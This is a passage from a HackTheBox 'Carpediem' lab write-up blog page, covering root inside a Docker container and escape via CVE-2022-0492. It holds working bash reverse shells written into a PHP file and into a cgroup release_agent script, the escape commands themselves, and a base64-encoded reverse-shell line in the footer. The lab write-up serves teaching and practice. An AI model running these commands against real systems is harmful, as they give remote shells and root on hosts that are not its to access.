+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">file_exists</span>($cmd)) {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">include</span> $cmd;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">ERROR: </span><span style="color:#e6db74">{</span>$cmd<span style="color:#e6db74">}</span><span style="color:#e6db74"> not found.</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">exit</span>();
+</span></span></code></pre></div><h3 id="getting-root-inside-container">Getting Root Inside Container</h3>
+<p>First, I&rsquo;ll get a full <em>TTY</em> shell (fully interactive shell) using <code>script</code> command since python3 isn&rsquo;t installed in the container:</p>
+<pre tabindex="0"><code>script -qc /bin/bash /dev/null
+[CTRL + z]
+stty raw -echo ; fg
+[Enter]
+</code></pre><p><img src="get_full_TTY.png" alt="Get Full TTY"></p>
+<p>Then, I&rsquo;ll override <em>index.php</em> inside backdrop directory with a php reverse shell back to <em>hflaccus</em> on the host target which is listening on port <em>6666</em>:</p>
+<p><code>echo '&lt;?php system(&quot;/bin/bash -c \&quot;bash -i &gt;&amp; /dev/tcp/172.17.0.1/6666 0&gt;&amp;1\&quot;&quot;) ?&gt;' &gt; backdrop/index.php</code></p>
+<p><img src="getting_root_in_docker.png" alt="Getting Root Shell Docker"></p>
+<p>Again, I&rsquo;ll get a full <em>TTY</em> shell:</p>
+<p><img src="getting_full_TTY_docker_root.png" alt="Getting Full TTY Shell Root"></p>
+<h3 id="listing-docker-capabilities">Listing Docker Capabilities</h3>
+<p>Now, if I try to list the <em>capabilities</em> for this container:</p>
+<pre tabindex="0"><code>cat /proc/$$/status | grep CapEff
+capsh --decode=00000000a00425fb
+</code></pre><p><img src="seeing_capabilities_docker.png" alt="List Docker Capabilities"></p>
+<h3 id="finding-cve-2022-0492-to-escape-docker">Finding CVE-2022-0492 To Escape Docker</h3>
+<p>I can&rsquo;t see something that can be abused here, however, a recent vulnerability 
+
+<a href="https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/" target="_blank"><em>CVE-2022-0492</em></a> has been discovered that allows us to get all the capabilities back and then abuse <em>cgroups</em> to escape from the container and get root on the host:</p>
+<p><code>unshare -UrmC bash</code></p>
+<p><img src="getting_all_caps_back.png" alt="Getting All Caps Back"></p>
+<p><code>mount -t cgroup -o rdma cgroup /mnt</code></p>
+<p><img src="mount_worked.png" alt="Mount Worked"></p>
+<h3 id="getting-root-on-carpediem">Getting Root On Carpediem</h3>
+<p>Mounting <em>cgroup</em> has worked, so now I&rsquo;ll abuse that to escape from docker and make <em>root</em> execute a reverse shell back to hflaccus listening on port <em>9696</em>:</p>
+<pre tabindex="0"><code>mkdir /mnt/x
+echo 1 &gt; /mnt/x/notify_on_release
+host_path=`sed -n &#39;s/.*\perdir=\([^,]*\).*/\1/p&#39; /etc/mtab`
+echo &#34;$host_path/cmd&#34; &gt; /mnt/release_agent
+echo &#39;#!/bin/sh&#39; &gt; /cmd
+echo &#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/172.17.0.1/9696 0&gt;&amp;1&#34;&#39; &gt;&gt; /cmd
+chmod a+x /cmd
+sh -c &#34;echo \$\$ &gt; /mnt/x/cgroup.procs&#34;
+</code></pre><p><img src="getting_root_carpediem.png" alt="Getting Root Carpediem"></p>
+
+      </div>
+    </article>
+
+    <hr />
+
+    <div class="post-info">
+      
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
+
+        <span class="tag"><a href="https://mostxeon.github.io/tags/hackthebox/">HackTheBox</a></span>
+        <span class="tag"><a href="https://mostxeon.github.io/tags/linux/">Linux</a></span>
+        <span class="tag"><a href="https://mostxeon.github.io/tags/bruteforce/">Bruteforce</a></span>
+        <span class="tag"><a href="https://mostxeon.github.io/tags/virtual-host-enumeration/">Virtual-Host-Enumeration</a></span>
+        <span class="tag"><a href="https://mostxeon.github.io/tags/gobuster/">Gobuster</a></span>
+        <span class="tag"><a href="https://mostxeon.github.io/tags/insecure-direct-object-reference/">Insecure-Direct-Object-Reference</a></span>
+        <span class="tag"><a href="https://mostxeon.github.io/tags/burp-suite/">Burp-Suite</a></span>
+        <span class="tag"><a href="https://mostxeon.github.io/tags/file-upload/">File-Upload</a></span>
+        <span class="tag"><a href="https://mostxeon.github.io/tags/docker/">Docker</a></span>
+        <span class="tag"><a href="https://mostxeon.github.io/tags/mongodb/">Mongodb</a></span>
+        <span class="tag"><a href="https://mostxeon.github.io/tags/mongosh/">Mongosh</a></span>
+        <span class="tag"><a href="https://mostxeon.github.io/tags/static-nmap/">Static-Nmap</a></span>
+        <span class="tag"><a href="https://mostxeon.github.io/tags/full-tty-python/">Full-TTY-Python</a></span>
+        <span class="tag"><a href="https://mostxeon.github.io/tags/port-forwarding/">Port-Forwarding</a></span>
+        <span class="tag"><a href="https://mostxeon.github.io/tags/chisel/">Chisel</a></span>
+        <span class="tag"><a href="https://mostxeon.github.io/tags/zoiper/">Zoiper</a></span>
+        <span class="tag"><a href="https://mostxeon.github.io/tags/clear-text-credentials/">Clear-Text-Credentials</a></span>
+        <span class="tag"><a href="https://mostxeon.github.io/tags/backdrop/">Backdrop</a></span>
+        <span class="tag"><a href="https://mostxeon.github.io/tags/ssl-sniffing/">SSL-Sniffing</a></span>
+        <span class="tag"><a href="https://mostxeon.github.io/tags/ssl-decryption/">SSL-Decryption</a></span>
+        <span class="tag"><a href="https://mostxeon.github.io/tags/backdrop-rce/">Backdrop-RCE</a></span>
+        <span class="tag"><a href="https://mostxeon.github.io/tags/full-tty-script/">Full-TTY-Script</a></span>
+        <span class="tag"><a href="https://mostxeon.github.io/tags/cve-2022-0492/">CVE-2022-0492</a></span>
+        <span class="tag"><a href="https://mostxeon.github.io/tags/docker-escape/">Docker-Escape</a></span>
+        
+    </p>
+
+      
+    <p>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-antenna-bars-4" width="19" height="19" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round" id="IconChangeColor"> <path stroke="none" d="M0 0h24v24H0z" fill="none" id="mainIconPathAttribute"></path> <line x1="6" y1="18" x2="6" y2="15"></line> <line x1="10" y1="18" x2="10" y2="12"></line> <line x1="14" y1="18" x2="14" y2="9"></line> <line x1="18" y1="18" x2="18" y2="18.01"></line> </svg>
+
+        
+        
+        <span class="difficulty"><a href="https://mostxeon.github.io/difficulty/hard/">Hard</a></span>
+        
+    </p>
+
+      
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
+          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+          <polyline points="14 2 14 8 20 8"></polyline>
+          <line x1="16" y1="13" x2="8" y2="13"></line>
+          <line x1="16" y1="17" x2="8" y2="17"></line>
+          <polyline points="10 9 9 9 8 9"></polyline>
+        </svg>
+        3385 Words
+      </p>
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
+          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+          <line x1="16" y1="2" x2="16" y2="6"></line>
+          <line x1="8" y1="2" x2="8" y2="6"></line>
+          <line x1="3" y1="10" x2="21" y2="10"></line>
+        </svg>
+        
+          2022-12-02 07:44
+        
+
+         
+          
+        
+      </p>
+    </div>
+      <hr />
+      <div class="sharing-buttons">
+        
+<a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fmostxeon.github.io%2fposts%2fcarpediem%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook">
+  <div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=https%3a%2f%2fmostxeon.github.io%2fposts%2fcarpediem%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter">
+  <div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small">
+      <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=Carpediem%20Write-Up&amp;caption=Carpediem%20Write-Up&amp;canonicalUrl=https%3a%2f%2fmostxeon.github.io%2fposts%2fcarpediem%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr">
+  <div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small">
+    <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.563 24c-5.093 0-7.031-3.756-7.031-6.411V9.747H5.116V6.648c3.63-1.313 4.512-4.596 4.71-6.469C9.84.051 9.941 0 9.999 0h3.517v6.114h4.801v3.633h-4.82v7.47c.016 1.001.375 2.371 2.207 2.371h.09c.631-.02 1.486-.205 1.936-.419l1.156 3.425c-.436.636-2.4 1.374-4.156 1.404h-.178l.011.002z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="mailto:?subject=Carpediem%20Write-Up&amp;body=https%3a%2f%2fmostxeon.github.io%2fposts%2fcarpediem%2f" target="_self" rel="noopener" aria-label="" title="Share via email">
+  <div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2fmostxeon.github.io%2fposts%2fcarpediem%2f&amp;media=https%3a%2f%2fmostxeon.github.io%2fposts%2fcarpediem%2f;description=Carpediem%20Write-Up" target="_blank" rel="noopener" aria-label="" title="Share on pinterest">
+  <div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024 0 1.518.769 1.518 1.688 0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128 0 3.768-2.245 3.768-5.487 0-2.861-2.063-4.869-5.008-4.869-3.41 0-5.409 2.562-5.409 5.199 0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.401.165-1.495-.69-2.433-2.878-2.433-4.646 0-3.776 2.748-7.252 7.92-7.252 4.158 0 7.392 2.967 7.392 6.923 0 4.135-2.607 7.462-6.233 7.462-1.214 0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607 0 11.985-5.365 11.985-11.987C23.97 5.39 18.592.026 11.985.026L12.017 0z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fmostxeon.github.io%2fposts%2fcarpediem%2f&amp;title=Carpediem%20Write-Up&amp;summary=Carpediem%20Write-Up&amp;source=https%3a%2f%2fmostxeon.github.io%2fposts%2fcarpediem%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin">
+  <div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=https%3a%2f%2fmostxeon.github.io%2fposts%2fcarpediem%2f&amp;resubmit=true&amp;title=Carpediem%20Write-Up" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
+  <div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm5.01 4.744c.688 0 1.25.561 1.25 1.249a1.25 1.25 0 0 1-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968 0 1.754.786 1.754 1.754 0 .716-.435 1.333-1.01 1.614a3.111 3.111 0 0 1 .042.52c0 2.694-3.13 4.87-7.004 4.87-3.874 0-7.004-2.176-7.004-4.87 0-.183.015-.366.043-.534A1.748 1.748 0 0 1 4.028 12c0-.968.786-1.754 1.754-1.754.463 0 .898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342 0 0 1 .14-.197.35.35 0 0 1 .238-.042l2.906.617a1.214 1.214 0 0 1 1.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687 0 1.248-.561 1.248-1.249 0-.688-.561-1.249-1.249-1.249zm5.5 0c-.687 0-1.248.561-1.248 1.25 0 .687.561 1.248 1.249 1.248.688 0 1.249-.561 1.249-1.249 0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327 0 0 0-.231.094.33.33 0 0 0 0 .463c.842.842 2.484.913 2.961.913.477 0 2.105-.056 2.961-.913a.361.361 0 0 0 .029-.463.33.33 0 0 0-.464 0c-.547.533-1.684.73-2.512.73-.828 0-1.979-.196-2.512-.73a.326.326 0 0 0-.232-.095z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2fmostxeon.github.io%2fposts%2fcarpediem%2f;title=Carpediem%20Write-Up" target="_blank" rel="noopener" aria-label="" title="Share on xing">
+  <div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M18.188 0c-.517 0-.741.325-.927.66 0 0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211 0 .375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016 0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894 0 21.686 0h-3.498zM3.648 4.74c-.211 0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016 0 .021L1.86 16.051c-.099.188-.093.381 0 .529.085.142.239.234.45.234h3.461c.518 0 .766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="whatsapp://send?text=Carpediem%20Write-Up%20https%3a%2f%2fmostxeon.github.io%2fposts%2fcarpediem%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp">
+  <div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fmostxeon.github.io%2fposts%2fcarpediem%2f&amp;t=Carpediem%20Write-Up" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
+  <div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+			<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=Carpediem%20Write-Up&amp;url=https%3a%2f%2fmostxeon.github.io%2fposts%2fcarpediem%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram">
+  <div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
+    </div>
+  </div>
+</a>
+
+      </div>
+
+    
+    <div class="pagination">
+        
+        <div class="pagination__title">
+            <span class="pagination__title-h">Read other posts</span>
+            <hr />
+        </div>
+        
+
+        <div class="pagination__buttons">
+            
+
+            
+            <span class="button next">
+                <a href="https://mostxeon.github.io/posts/shared/">
+                    <span class="button__text">Shared Write-Up</span>
+                    <span class="button__icon">→</span>
+                </a>
+            </span>
+            
+        </div>
+    </div>
+
+
+    
+
+    
+
+  </main>
+
+            </div>
+
+            
+                <footer id="socials" class="footer">
+    <main aria-role="main">
+        <div class="footer_author">
+            
+            
+    
+            <h2><a href="https://mostxeon.github.io/">Most Xeon</a></h2>
+    
+            
+    <h6>YmFzaCAtaSA&#43;JiAvZGV2L3RjcC9EUkVBTS8xMzM3IDA&#43;JjE=</h6>
+                <div class="social-icons-class">
+                    &nbsp; <a href="https://twitter.com/" target="_blank" rel="noopener" title="Twitter"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg></a> &nbsp;&nbsp; <a href="mailto:mostxeon@gmail.com" target="_blank" rel="noopener" title="Email"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg></a> &nbsp;&nbsp; <a href="https://github.com/MostXeon" target="_blank" rel="noopener" title="Github"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path></svg></a> &nbsp;
+                </div>
+        </div>
+    </main>
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2022</span>
+            
+            <span><a href="https://mostxeon.github.io/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+            
+        </div>
+    </div>
+    
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by <a href="http://gohugo.io">Hugo</a></span><span>Tweaked from the one by <a href="https://github.com/rhazdon">Djordje Atlialp</a></span>
+        </div>
+    </div>
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="/bundle.min.923d14538da8896ffabde570adf70a56ac677c982dd4be31b4b4b65a67c17bfdb6f99d38228bea3c25e1205fd69abf149502492621047fe3a2c819646d50cb0b.js" integrity="sha512-kj0UU42oiW/6veVwrfcKVqxnfJgt1L4xtLS2WmfBe/22&#43;Z04IovqPCXhIF/Wmr8UlQJJJiEEf&#43;OiyBlkbVDLCw=="></script>
+
+
+
+    </body>
+</html>
